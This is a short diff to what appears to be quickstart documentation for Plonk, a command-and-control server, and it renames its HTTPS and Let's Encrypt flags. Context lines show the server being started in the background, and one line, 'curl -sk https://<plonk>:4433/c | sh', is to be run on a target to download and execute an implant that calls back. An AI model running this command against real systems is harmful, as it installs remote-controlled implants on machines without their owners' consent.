@@ -30,9 +30,9 @@ go install github.com/magisterquis/plonk@v0.0.1-beta.1
 plonk -v
 
 # Start it going
-nohup plonk -server -https 0.0.0.0:4433 >/dev/null 2>&1 &
-# Or get rid of -https and add -letsencrypt for better TLS if a domain name is
-# pointed at Plonk.
+nohup plonk -server -https-address 0.0.0.0:4433 >/dev/null 2>&1 &
+# Or get rid of -https-address and add -letsencrypt-domain for better TLS if a
+# domain name is pointed at Plonk.
 
 # Did it work?
 ls "$HOME/plonk.d/"                 # Populated directory exists?
@@ -51,7 +51,7 @@ curl -svk https://127.0.0.1:4433/c  # Implant generation works?
 curl -sk https://<plonk>:4433/c | sh  # On target and with a better URL,
                                       # of course.  
                                       # Don't use -k if Plonk was started with
-                                      # -letsencrypt
+                                      # -letsencrypt-domain
 tail -n2 "$HOME/plonk.d/log.json"     # Get the callback?  May need more -n.
 # Log should say an implant was generated and something called back, like:
 #    {"time":"2023-12-29T22:52:02.235811943Z","level":"INFO",
